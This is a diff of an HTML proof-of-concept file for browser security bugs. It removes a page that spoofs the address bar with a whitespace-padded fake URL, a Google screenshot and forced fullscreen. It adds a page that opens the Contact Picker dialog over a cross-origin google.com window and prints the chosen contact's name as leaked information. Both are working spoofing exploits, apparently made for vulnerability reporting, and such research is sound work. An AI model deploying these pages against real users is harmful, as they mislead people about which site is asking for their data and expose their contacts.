@@ -1,53 +1,28 @@
-
-<!DOCTYPE HTML>
-<html lang="en-US">
-<head>
-	<meta charset="UTF-8">
-	<title>Omnibox spoofing</title>
-	<style>
-		body{
-		    margin-top: 0px; 
-		    margin-bottom: 0px; 
-		    margin-left: 0px; 
-		    margin-right: 0px;
-		    padding: 0;
-		}
-	</style>
-</head>
-
-<body>
-
-	<img id="img" style="display: none;" src="https://i.imgur.com/pkg3Z6H.png"></img>
-
-	<div id="content">
-		<center>
-			<br>
-			<h1>Click on the omnibox</h1>
-		</center>
-	</div>
-
-</body>
-
-<script>
-
-var spoofed = false;
-
-window.onblur = function() {
-
-	if (!spoofed) {
-		alert("You are being redirected to https://www.google.com");
-		location.hash = "  https://www.google.com                                                                                                                                                                                                                                     ";
-		document.getElementById("img").style.display = "block";
-		document.getElementById("content").style.display = "none";
-		spoofed = true;
-	}
-
-};
-
-window.onclick = function() {
-	if (spoofed) {
-		document.documentElement.webkitRequestFullScreen();
-	}
-}
-
-</script>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
+                    `);
+                })();
+                open("https://www.google.com", "PoC", "_blank");
+            }
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
+        </center>
+    </body>
+  </body>
+</html>
